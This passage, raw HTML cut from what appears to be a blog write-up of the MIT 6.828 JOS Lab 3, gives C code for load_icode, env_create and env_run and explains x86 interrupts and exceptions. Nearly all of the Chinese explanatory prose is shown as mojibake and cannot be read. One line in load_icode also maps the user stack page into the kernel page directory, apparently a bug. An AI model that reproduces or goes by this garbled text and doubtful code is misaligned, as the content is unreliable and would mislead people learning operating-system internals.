class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">load_icode</span><span class="params">(<span class="keyword">struct</span> Env *e, <span class="type">uint8_t</span> *binary)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Hints:</span></span><br><span class="line"><span class="comment">//  Load each program segment into virtual memory</span></span><br><span class="line"><span class="comment">//  at the address specified in the ELF segment header.</span></span><br><span class="line"><span class="comment">//  You should only load segments with ph-&gt;p_type == ELF_PROG_LOAD.</span></span><br><span class="line"><span class="comment">//  Each segment&#x27;s virtual address can be found in ph-&gt;p_va</span></span><br><span class="line"><span class="comment">//  and its size in memory can be found in ph-&gt;p_memsz.</span></span><br><span class="line"><span class="comment">//  The ph-&gt;p_filesz bytes from the ELF binary, starting at</span></span><br><span class="line"><span class="comment">//  &#x27;binary + ph-&gt;p_offset&#x27;, should be copied to virtual address</span></span><br><span class="line"><span class="comment">//  ph-&gt;p_va.  Any remaining memory bytes should be cleared to zero.</span></span><br><span class="line"><span class="comment">//  (The ELF header should have ph-&gt;p_filesz &lt;= ph-&gt;p_memsz.)</span></span><br><span class="line"><span class="comment">//  Use functions from the previous lab to allocate and map pages.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  All page protection bits should be user read/write for now.</span></span><br><span class="line"><span class="comment">//  ELF segments are not necessarily page-aligned, but you can</span></span><br><span class="line"><span class="comment">//  assume for this function that no two segments will touch</span></span><br><span class="line"><span class="comment">//  the same virtual page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  You may find a function like region_alloc useful.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Loading the segments is much simpler if you can move data</span></span><br><span class="line"><span class="comment">//  directly into the virtual addresses stored in the ELF binary.</span></span><br><span class="line"><span class="comment">//  So which page directory should be in force during</span></span><br><span class="line"><span class="comment">//  this function?</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  You must also do something with the program&#x27;s entry point,</span></span><br><span class="line"><span class="comment">//  to make sure that the environment starts executing there.</span></span><br><span class="line"><span class="comment">//  What?  (See env_run() and env_pop_tf() below.)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Elf</span> *<span class="title">elfhdr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">ustack</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check ELF magic</span></span><br><span class="line">elfhdr = (<span class="keyword">struct</span> Elf*) binary;</span><br><span class="line"><span class="keyword">if</span> (elfhdr-&gt;e_magic != ELF_MAGIC)</span><br><span class="line">panic(<span class="string">&quot;Invalid ELF header!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch to user pgdir</span></span><br><span class="line">lcr3(PADDR(e-&gt;env_pgdir));</span><br><span class="line"></span><br><span class="line"><span class="comment">// analyze the header table and copy data</span></span><br><span class="line">ph = (<span class="keyword">struct</span> Proghdr *) (binary + elfhdr-&gt;e_phoff);</span><br><span class="line">eph = ph + elfhdr-&gt;e_phnum;</span><br><span class="line"><span class="keyword">for</span> (; ph &lt; eph; ph++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ph-&gt;p_type != ELF_PROG_LOAD)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">region_alloc(e, (<span class="type">void</span>*)ph-&gt;p_va, ph-&gt;p_memsz);</span><br><span class="line"><span class="built_in">memset</span>((<span class="type">void</span>*)(ph-&gt;p_va), <span class="number">0</span>, ph-&gt;p_memsz);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span>*)(ph-&gt;p_va), (<span class="type">void</span>*)(binary + ph-&gt;p_offset), ph-&gt;p_filesz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the entry point</span></span><br><span class="line">e-&gt;env_tf.tf_eip = elfhdr-&gt;e_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Now map one page for the program&#x27;s initial stack</span></span><br><span class="line"><span class="comment">// at virtual address USTACKTOP - PGSIZE.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line">region_alloc(e, (<span class="type">void</span>*)(USTACKTOP - PGSIZE), PGSIZE);</span><br><span class="line">ustack = page_lookup(e-&gt;env_pgdir, (<span class="type">void</span>*)(USTACKTOP - PGSIZE), <span class="literal">NULL</span>);</span><br><span class="line">page_insert(kern_pgdir, ustack, (<span class="type">void</span>*)(USTACKTOP - PGSIZE), PTE_U | PTE_W);</span><br><span class="line"></span><br><span class="line"><span class="comment">// recover kernel pgdir</span></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="env-create-ï¼šåˆ›å»ºè¿›ç¨‹ç¯å¢ƒ"><a href="#env-create-ï¼šåˆ›å»ºè¿›ç¨‹ç¯å¢ƒ" class="headerlink" title="env_create()ï¼šåˆ›å»ºè¿›ç¨‹ç¯å¢ƒ"></a>env_create()ï¼šåˆ›å»ºè¿›ç¨‹ç¯å¢ƒ</h4><p>è°ƒç”¨ <code>env_alloc()</code> åˆ†é… PCBã€è°ƒç”¨ <code>load_icode()</code> è§£æè½½å…¥ ELF å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocates a new env with env_alloc, loads the named elf</span></span><br><span class="line"><span class="comment">// binary into it with load_icode, and sets its env_type.</span></span><br><span class="line"><span class="comment">// This function is ONLY called during kernel initialization,</span></span><br><span class="line"><span class="comment">// before running the first user-mode environment.</span></span><br><span class="line"><span class="comment">// The new env&#x27;s parent ID is set to 0.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_create</span><span class="params">(<span class="type">uint8_t</span> *binary, <span class="keyword">enum</span> EnvType type)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span> *<span class="title">new_env</span>;</span></span><br><span class="line"><span class="keyword">switch</span>(env_alloc(&amp;new_env, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">// success</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> -E_NO_FREE_ENV:</span><br><span class="line">panic(<span class="string">&quot;No free Env now!&quot;</span>);</span><br><span class="line"><span class="keyword">case</span> -E_NO_MEM:</span><br><span class="line">panic(<span class="string">&quot;OOM while alloc the Env!&quot;</span>);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">panic(<span class="string">&quot;unknown fault from env_alloc!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">new_env-&gt;env_type = type;</span><br><span class="line">load_icode(new_env, binary);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="env-run-ï¼šå°†è¿›ç¨‹åŠ å…¥è¿è¡Œé˜Ÿåˆ—"><a href="#env-run-ï¼šå°†è¿›ç¨‹åŠ å…¥è¿è¡Œé˜Ÿåˆ—" class="headerlink" title="env_run()ï¼šå°†è¿›ç¨‹åŠ å…¥è¿è¡Œé˜Ÿåˆ—"></a>env_run()ï¼šå°†è¿›ç¨‹åŠ å…¥è¿è¡Œé˜Ÿåˆ—</h4><p>åˆ†ä¸ºä¸‰æ­¥èµ°ï¼š</p><ul><li>è‹¥å½“å‰æœ‰è¿›ç¨‹åœ¨è¿è¡Œï¼ˆcurenv !&#x3D; NULL)ï¼Œå°†å…¶çŠ¶æ€è®¾ä¸º <code>ENV_RUNNABLE</code></li><li>å°† curenv è®¾ä¸ºå¾…è¿è¡Œè¿›ç¨‹çš„ Envå¹¶æ”¹å˜å…¶çŠ¶æ€ã€å¢åŠ è¿è¡Œæ¬¡æ•°è®¡æ•°ï¼Œåˆ‡æ¢åˆ°ç”¨æˆ·é¡µè¡¨</li><li>æ¢å¤ç”¨æˆ·è¿›ç¨‹è¿è¡Œä¸Šä¸‹æ–‡ï¼Œä»å†…æ ¸æ€åˆ‡æ¢åˆ°ç”¨æˆ·æ€</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Context switch from curenv to env e.</span></span><br><span class="line"><span class="comment">// Note: if this is the first call to env_run, curenv is NULL.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This function does not return.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">env_run</span><span class="params">(<span class="keyword">struct</span> Env *e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Step 1: If this is a context switch (a new environment is running):</span></span><br><span class="line"><span class="comment">//   1. Set the current environment (if any) back to</span></span><br><span class="line"><span class="comment">//      ENV_RUNNABLE if it is ENV_RUNNING (think about</span></span><br><span class="line"><span class="comment">//      what other states it can be in),</span></span><br><span class="line"><span class="comment">//   2. Set &#x27;curenv&#x27; to the new environment,</span></span><br><span class="line"><span class="comment">//   3. Set its status to ENV_RUNNING,</span></span><br><span class="line"><span class="comment">//   4. Update its &#x27;env_runs&#x27; counter,</span></span><br><span class="line"><span class="comment">//   5. Use lcr3() to switch to its address space.</span></span><br><span class="line"><span class="comment">// Step 2: Use env_pop_tf() to restore the environment&#x27;s</span></span><br><span class="line"><span class="comment">//   registers and drop into user mode in the</span></span><br><span class="line"><span class="comment">//   environment.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Hint: This function loads the new environment&#x27;s state from</span></span><br><span class="line"><span class="comment">//e-&gt;env_tf.  Go back through the code you wrote above</span></span><br><span class="line"><span class="comment">//and make sure you have set the relevant parts of</span></span><br><span class="line"><span class="comment">//e-&gt;env_tf to sensible values.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LAB 3: Your code here.</span></span><br><span class="line"><span class="keyword">if</span> (curenv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (curenv-&gt;env_status)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> ENV_RUNNING:</span><br><span class="line"><span class="keyword">case</span> ENV_RUNNABLE:</span><br><span class="line"><span class="keyword">case</span> ENV_NOT_RUNNABLE:</span><br><span class="line">curenv-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ENV_FREE:</span><br><span class="line">panic(<span class="string">&quot;running a free Env!&quot;</span>);</span><br><span class="line"><span class="keyword">case</span> ENV_DYING:</span><br><span class="line">panic(<span class="string">&quot;running a dying Env!&quot;</span>);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">panic(<span class="string">&quot;The env is crashed!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// set the curenv</span></span><br><span class="line">curenv = e;</span><br><span class="line">curenv-&gt;env_status = ENV_RUNNING;</span><br><span class="line">curenv-&gt;env_runs++;</span><br><span class="line"></span><br><span class="line"><span class="comment">// recover the context of process and ret2usr</span></span><br><span class="line">lcr3(PADDR(curenv-&gt;env_pgdir));</span><br><span class="line">env_pop_tf(&amp;curenv-&gt;env_tf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// we never arrive there</span></span><br><span class="line">panic(<span class="string">&quot;env_run not yet implemented&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®Œæˆè¿™ä¸€åˆ‡åï¼Œæˆ‘ä»¬æ¥è·‘ä¸€ä¸‹è¿™ä»½ä»£ç ï¼Œ<strong>ä½ ä¼šå‘ç°å†…æ ¸æˆåŠŸåœ°è¿è¡Œäº†ç¨‹åº helloï¼Œå¹¶åœ¨å…¶å°è¯•è°ƒç”¨ 0x30å·ä¸­æ–­æ—¶ è§¦å‘äº† triple fault å¯¼è‡´è¿è¡Œæš‚åœ</strong></p><p><img src="https://s2.loli.net/2022/03/17/5E9QxkMsrFnKoOq.png" alt="image.png"></p><p>é‚£ä¸ºä»€ä¹ˆä¼šè§¦å‘ triple fault å‘¢ï¼Ÿå¦‚åŒ 32ä½ Linux kernel æ‰€åšçš„ä¸€èˆ¬ï¼ŒJOS ä¹Ÿå°†ç³»ç»Ÿè°ƒç”¨å®ç°ä¸ºä¸€ä¸ªä¸­æ–­ï¼Œè¿™ä¾¿æ˜¯ç¬¬ä¸€ä¸ª faultï¼ˆéœ€è¦æ³¨æ„ fault å¹¶ééƒ½ä»£è¡¨é”™è¯¯ï¼Œå¾ˆå¤šæœºåˆ¶å…¶å®æ˜¯é€šè¿‡è¿™ç§â€œfaultâ€çš„è§¦å‘è€Œå®ç°çš„ï¼‰ï¼›è€Œç”±äº JOS å°šæœªè®¾ç½®ä¸­æ–­å¤„ç†ç¨‹åºï¼Œå› æ­¤ CPU ä¼šç”Ÿæˆä¸€ä¸ª general protection exceptionï¼Œè¿™ä¾¿æ˜¯ double faultï¼›ç„¶å CPU åˆè¦å¤„ç†ç”Ÿæˆçš„è¿™ä¸ª exceptionï¼Œä½†æ˜¯æ²¡æœ‰å¯¹åº”çš„å¤„ç†ç¨‹åºï¼ˆå¥—å¨ƒäº†ï¼‰ï¼Œäºæ˜¯å°± triple fault äº†ï¼Œä½†æ˜¯è¿™å¹¶ä¸ä¼šæ— é™åµŒå¥—ä¸‹å»ï¼Œåœ¨ triple fault çš„æ—¶å€™ç³»ç»Ÿå°±å®Œå…¨æ— æ³•è¿è¡Œäº†ï¼Œé€šå¸¸æƒ…å†µä¸‹å°±é‡å¯äº†ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ patched qemu æ‰€ä»¥ä¼šè¢« qemu æŒ‚èµ·</p><h3 id="Handling-Interrupts-and-Exceptions"><a href="#Handling-Interrupts-and-Exceptions" class="headerlink" title="Handling Interrupts and Exceptions"></a>Handling Interrupts and Exceptions</h3><p>å› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å®ç°ä¸­æ–­å¤„ç†ä¸å¼‚å¸¸å¤„ç†ï¼Œé¦–å…ˆæ˜¯ Exercise 3ï¼Œé˜…è¯»äº†è§£ä¸­æ–­ä¸å¼‚å¸¸ç›¸å…³åŸºç¡€çŸ¥è¯†</p><blockquote><p><strong>Exercise 3.</strong> Read <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/c09.htm">Chapter 9, Exceptions and Interrupts</a> in the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">80386 Programmerâ€™s Manual</a> (or Chapter 5 of the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/ia32/IA32-3A.pdf">IA-32 Developerâ€™s Manual</a>), if you havenâ€™t already.</p></blockquote><p><strong>ä¸­æ–­</strong>ï¼ˆinterruptï¼‰ä¸<strong>å¼‚å¸¸</strong>ï¼ˆexceptionï¼‰æ˜¯ä¸¤ç§ç‰¹åˆ«çš„æ”¹å˜æ§åˆ¶æµçš„æ–¹å¼ï¼Œå…¶å·¥ä½œåŸç†ç±»ä¼¼äºéç¼–ç¨‹å¼çš„ <code>call</code> æŒ‡ä»¤â€”â€”æ”¹å˜æ­£å¸¸çš„ç¨‹åºæµç¨‹ä»¥å¤„ç†å¤–éƒ¨äº‹ä»¶æˆ–æŠ¥å‘Šé”™è¯¯ä¸å¼‚å¸¸æƒ…å†µ</p><p>ä¸­æ–­ä¸å¼‚å¸¸çš„åŒºåˆ«åœ¨äºä¸­æ–­ç”¨ä»¥å¤„ç†å¤„ç†å™¨å¤–çš„å¼‚æ­¥äº‹ä»¶ï¼Œè€Œå¼‚å¸¸åˆ™æ˜¯å¤„ç†å™¨åœ¨è¿è¡Œæ—¶æ£€æµ‹åˆ°å¼‚å¸¸äº‹ä»¶åçš„å¤„ç†</p><p>ä¸­æ–­ä¸å¼‚å¸¸é€šå¸¸æœ‰å¦‚ä¸‹æ¥æºï¼š</p><ul><li>ä¸­æ–­ï¼š<ul><li>å¯å±è”½ä¸­æ–­ï¼Œé€šè¿‡ INTR å¼•è„šå‘å‡º</li><li>ä¸å¯å±è”½ä¸­æ–­ï¼Œé€šè¿‡ NMI å¼•è„šå‘å‡º</li></ul></li><li>å¼‚å¸¸ï¼š<ul><li>ç”±å¤„ç†å™¨æ£€æµ‹åˆ°çš„ï¼Œå…·ä½“å¯åˆ†ä¸º faultsã€traps ä¸ aborts</li><li>ç¼–ç¨‹å¼çš„ï¼Œé€šè¿‡æŒ‡ä»¤ intoã€int 3ã€int nã€bound å¯è§¦å‘å¼‚å¸¸ï¼Œé€šå¸¸ç§°ä¹‹ä¸ºâ€œè½¯ä¸­æ–­â€ï¼Œä½†å¤„ç†å™¨å°†å…¶ä½œä¸ºå¼‚å¸¸æ¥å¤„ç†</li></ul></li></ul><h4 id="Identify-Interrupts"><a href="#Identify-Interrupts" class="headerlink" title="Identify Interrupts"></a>Identify Interrupts</h4><p>å¤„ç†å™¨å°†ä¸åŒçš„ä¸­æ–­ä¸å¼‚å¸¸è¿›è¡Œç‹¬ç«‹æ ‡å·ï¼Œå…¶ä¸­ NMI ä¸å¼‚å¸¸å¯¹åº”æ ‡å· 0 ~ 31ï¼ˆå¹¶éæ‰€æœ‰æ ‡å·éƒ½æœ‰å¯¹åº”ç”¨é€”ï¼Œéƒ¨åˆ†æ ‡å·ä¸ºæœªæ¥ä¿ç•™ï¼‰ï¼›å¯å±è”½ä¸­æ–­çš„æ ‡è¯†ç¬¦ç”±å¤–éƒ¨ä¸­æ–­æ§åˆ¶å™¨ï¼ˆä¾‹å¦‚ Intel 8259A çš„å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨ï¼ˆProgrammable Interrupt Controllerï¼‰ï¼‰ç¡®å®šï¼Œå¹¶åœ¨å¤„ç†å™¨çš„ä¸­æ–­ç¡®è®¤åºåˆ—ä¸­ä¸å¤„ç†å™¨é€šä¿¡ï¼Œ8259A çš„ PIC åˆ†é…çš„æ ‡å·å¯ä»¥ç”±è½¯ä»¶æŒ‡å®šï¼ŒèŒƒå›´ä¸º 32 ~ 255</p><p>æ ¹æ®å¼‚å¸¸æŠ¥å‘Šçš„æ–¹å¼ä¸æ˜¯å¦æ”¯æŒé‡å¯æŒ‡ä»¤å°†å…¶åˆ†ä¸ºä¸‰ç±»ï¼š</p><ul><li><p>Faultsï¼šåœ¨â€œæŒ‡ä»¤é€ æˆå¼‚å¸¸å‰â€è¢«æŠ¥å‘Šçš„å¼‚å¸¸ï¼Œå¯ä»¥æ˜¯åœ¨æŒ‡ä»¤å¼€å§‹æ‰§è¡Œæ—¶æˆ–æ˜¯æ‰§è¡Œè¿‡ç¨‹ä¸­è¢«æ£€æµ‹åˆ°ï¼Œè‹¥åœ¨æ‰§è¡ŒæŒ‡ä»¤æ—¶æ£€æµ‹åˆ°å¼‚å¸¸ï¼Œåˆ™ä¼šä¿å­˜å½“å‰ä¸Šä¸‹æ–‡ï¼Œå®Œæˆå¼‚å¸¸å¤„ç†åå†æ¢å¤ä¸Šä¸‹æ–‡ï¼Œ<strong>é‡æ–°ä»é€ æˆå¼‚å¸¸çš„æŒ‡ä»¤å¼€å§‹æ‰§è¡Œ</strong></p><blockquote><p>ä¸¾ä¸ªğŸŒ°ï¼šLinux ä¸­çš„ page fault å°±æ˜¯è¿™æ ·çš„ä¸€ç§å¼‚å¸¸ï¼Œå½“è¯»å†™å°šæœªåˆ†é…å†…å­˜é¡µçš„åœ°å€æ—¶ï¼ˆæ¯”å¦‚è¯´ mmap åˆ†é…äº†ä¸€ä¸ª vma ä½†æ˜¯è¿˜æ²¡åˆ†é…ç‰©ç†é¡µæ¡†ï¼‰ä¾¿ä¼šè§¦å‘ç¼ºé¡µå¼‚å¸¸å¤„ç†ç¨‹åºï¼Œåˆ†é…å†…å­˜é¡µåå†é‡æ–°ä»è¯»å†™çš„æŒ‡ä»¤å¼€å§‹è¿è¡Œ</p></blockquote></li><li><p>Trapsï¼šåœ¨æ£€æµ‹åˆ°å¼‚å¸¸çš„æŒ‡ä»¤åç«‹å³åœ¨æŒ‡ä»¤è¾¹ç•ŒæŠ¥å‘Šçš„å¼‚å¸¸ï¼ˆ<del>åˆ«é—®ï¼ŒğŸ‘´ä¹Ÿæ²¡çœ‹æ‡‚è‹±æ–‡åŸæ–‡å•¥æ„æ€</del>ï¼‰</p><blockquote><p>ä¸¾ä¸ªğŸŒ°ï¼šç³»ç»Ÿè°ƒç”¨çš„æµç¨‹ç®€åŒ–åç±»ä¼¼äºä¸€ä¸ªé™·é˜±ï¼Œç”¨æˆ·æ€è¿›ç¨‹å¸ƒç½®å¥½æ•°æ®åé€šè¿‡æŒ‡ä»¤é™·å…¥åˆ°å†…æ ¸æ€ï¼Œå†…æ ¸å®Œæˆå¤„ç†åå†è¿”å›ç”¨æˆ·æ€ï¼Œæ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤</p></blockquote></li><li><p>Abortsï¼šæ˜¯ä¸€ç§æ—¢ä¸ç²¾ç¡®å®šä½æŒ‡ä»¤ä¹Ÿä¸é‡å¯ç¨‹åºçš„å¼‚å¸¸ï¼Œé€šå¸¸ç”¨æ¥æŠ¥å‘Š<strong>ä¸¥é‡çš„é”™è¯¯</strong>ï¼ˆä¾‹å¦‚ç¡¬ä»¶é”™è¯¯æˆ–éæ³•å€¼ï¼‰</p><blockquote><p>ä¾‹å¦‚é™¤ä»¥ 0 å¯èƒ½å°±æ˜¯ä¸€ç§ Abortï¼Ÿ</p></blockquote></li></ul><p>ä¸‹è¡¨æ˜¾ç¤ºäº†ä¸­æ–­ä¸å¼‚å¸¸å¯¹åº”ç±»å‹çš„æ ‡è¯†ç¬¦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Table 9-1. Interrupt and Exception ID Assignments</span><br><span class="line"></span><br><span class="line">Identifier   Description</span><br><span class="line"></span><br><span class="line">0            Divide error</span><br><span class="line">1            Debug exceptions</span><br><span class="line">2            Nonmaskable interrupt</span><br><span class="line">3            Breakpoint (one-byte INT 3 instruction)</span><br><span class="line">4            Overflow (INTO instruction)</span><br><span class="line">5            Bounds check (BOUND instruction)</span><br><span class="line">6            Invalid opcode</span><br><span class="line">7            Coprocessor not available</span><br><span class="line">8            Double fault</span><br><span class="line">9            (reserved)</span><br><span class="line">10           Invalid TSS</span><br><span class="line">11           Segment not present</span><br><span class="line">12           Stack exception</span><br><span class="line">13           General protection</span><br><span class="line">14           Page fault</span><br><span class="line">15           (reserved)</span><br><span class="line">16           Coprecessor error</span><br><span class="line">17-31        (reserved)</span><br><span class="line">32-255       Available for external interrupts via INTR pin</span><br></pre></td></tr></table></figure><h4 id="Enabling-and-Disabling-Interrupts"><a href="#Enabling-and-Disabling-Interrupts" class="headerlink" title="Enabling and Disabling Interrupts"></a>Enabling and Disabling Interrupts</h4><p>è‹¥å¤šä¸ªä¸­æ–­åŒæ—¶å‘ç”Ÿï¼Œæˆ‘ä»¬ä¸åº”å½“åœ¨å¤„ç†ä¸€ä¸ªä¸­æ–­æ—¶è·‘å»å¤„ç†å¦ä¸€ä¸ªä¸­æ–­ï¼Œå› æ­¤éœ€è¦æ˜ç¡®ä»€ä¹ˆæ—¶å€™èƒ½è¿›è¡Œä¸­æ–­å¤„ç†</p><p>å¯¹äºä¸å¯å±è”½ä¸­æ–­è€Œè¨€ï¼Œå¤„ç†å™¨åœ¨æ‰§è¡Œåˆ° iret æŒ‡ä»¤ä¹‹å‰éƒ½ä¼šå¿½ç•¥ NMI å¼•è„šä¸Šçš„ä¸­æ–­ä¿¡å·</p><p>å¯¹äºå¯å±è”½ä¸­æ–­è€Œè¨€ï¼Œå½“ IF æ ‡å¿—ä½ä¸º 0 æ—¶ä¸­æ–­è¢«å…³é—­ï¼Œåªæœ‰åœ¨ IF &#x3D;&#x3D; 1æ—¶æ‰èƒ½è¿›è¡Œï¼Œä¸å…¶ä»–æ ‡å¿—ä½ä¸€æ ·ï¼Œåœ¨å¤„ç†å™¨é‡ç½®æ—¶ IF ä¼šè¢«æ¸…ç©ºï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>cli</code> ä¸ <code>sli</code> æŒ‡ä»¤æ¸…ç©ºæˆ–è®¾ç½® IF æ ‡å¿—ä½ï¼Œè¿™ä¸¤ä¸ªæŒ‡ä»¤åªæœ‰åœ¨ CLI ï¼ˆç‰¹æƒçº§ï¼‰&lt;&#x3D; IOPL æ—¶æ‰å¯ç”¨ï¼Œå¦åˆ™ä¼šè§¦å‘ä¿æŠ¤å¼‚å¸¸</p><p>IF æ ‡å¿—ä½è¿˜ä¼šè¢«è¿™äº›æ“ä½œå½±å“ï¼š</p><ul><li><code>pushf</code> æŒ‡ä»¤å°† eflags å¯„å­˜å™¨çš„å€¼æ¨åˆ°æ ˆä¸Š</li><li>åœ¨ä»»åŠ¡åˆ‡æ¢æ—¶ä¼šè°ƒç”¨ <code>popf</code> ä¸ <code>iret</code> æŒ‡ä»¤è½½å…¥æ ‡å¿—ä½å¯„å­˜å™¨</li><li>åœ¨é€šè¿‡ä¸­æ–­é—¨æ—¶ä¼šè‡ªåŠ¨é‡ç½® IF æ ‡å¿—ä½ï¼Œå…³é—­ä¸­æ–­</li></ul><p>RF æ ‡å¿—ä½ç”¨ä»¥æ§åˆ¶ debug faultï¼Œå¯¹äºç»™å®šæŒ‡ä»¤å…¶æœ€å¤šä¼šè¢«è§¦å‘ä¸€æ¬¡</p><p>å¯¹ ss å¯„å­˜å™¨çš„æ›´æ”¹ï¼ˆmov æˆ– popï¼‰ä¹Ÿä¼šå½±å“ä¸€äº›ä¸­æ–­ä¸å¼‚å¸¸ï¼Œä¾‹å¦‚æˆ‘ä»¬æ”¹å˜å †æ ˆï¼ˆ<code>ss:esp</code>ï¼‰çš„è¿‡ç¨‹ä¸­ï¼ˆåˆšå¥½æ”¹äº† ss æ²¡æ”¹ espï¼‰å¤„ç†äº†ä¸­æ–­æˆ–å¼‚å¸¸ï¼Œåˆ™å †æ ˆæŒ‡é’ˆåœ¨ä¸­æ–­&#x2F;å¼‚å¸¸å¤„ç†çš„è¿‡ç¨‹ä¸­æ˜¯ä¸ä¸€è‡´çš„ï¼Œå› æ­¤ 80386 åœ¨æ›´æ”¹ ss çš„æŒ‡ä»¤åçš„æŒ‡ä»¤è¾¹ç•Œå¤„ç¦æ­¢ NMIã€INTRã€debug fault æˆ–å•æ­¥é™·é˜±ï¼Œå¯èƒ½ä¼šæœ‰ä¾‹å¤–ï¼špage fault æˆ– general protection faultï¼Œå› 